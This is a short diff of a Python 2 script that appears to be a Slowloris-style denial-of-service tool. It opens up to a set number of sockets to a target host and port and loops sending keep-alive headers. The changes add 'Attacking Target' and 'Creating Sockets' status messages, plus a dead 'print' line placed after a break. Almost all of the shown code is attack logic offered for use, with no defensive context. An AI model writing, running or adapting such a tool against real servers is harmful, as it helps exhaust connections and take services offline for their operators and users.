@@ -83,11 +83,14 @@ def main():
             max_socket = 150
 
         if argus.host and argus.port:
+            print ('       Attacking Target: %s:%s with %s sockets\n\n'%(argus.host,str(argus.port),str(max_socket)))
+            print ('                 Creating Sockets...\n\n')
             for i in range(int(max_socket)):
                 try:
                     s = MainThread(argus.host,argus.port).run()             
                 except socket.error:
                     break
+                    print 'error'
                 socket_list.append(s)
             while True:
                 print "\tSending Keep Alive Headers... Socket Count: %s"%(len(socket_list))
@@ -113,4 +116,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
